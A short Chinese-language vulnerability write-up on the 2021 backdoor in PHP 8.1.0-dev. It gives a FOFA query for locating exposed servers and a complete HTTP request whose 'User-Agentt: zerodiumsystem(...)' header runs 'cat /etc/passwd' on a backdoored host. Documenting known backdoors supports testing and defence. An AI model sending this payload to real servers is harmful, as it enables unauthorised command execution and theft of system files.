# PHP-8.1.0-dev zerodium后门命令执行漏洞

# 一、漏洞简介
PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送`User-Agentt`头来执行任意代码。

# 二、影响版本
+ PHP/8.1.0-dev

# 三、资产测绘
+ fofa`"PHP/8.1.0-dev"`
+ 特征

![1696168261552-13f55cc9-34bf-4a45-b935-812435375e09.png](./img/NF04CG2inYN-Es8-/1696168261552-13f55cc9-34bf-4a45-b935-812435375e09-358972.png)

# 四、漏洞复现
```plain
GET / HTTP/1.1
Host: xx.xx.xx.xx
User-Agentt: zerodiumsystem("cat /etc/passwd");
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
```

![1696168333495-01ed0a8c-814b-48b8-94bf-dd024eb424c7.png](./img/NF04CG2inYN-Es8-/1696168333495-01ed0a8c-814b-48b8-94bf-dd024eb424c7-736557.png)



> 更新: 2024-09-05 23:27:24  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wr81rdntsr6nz25n>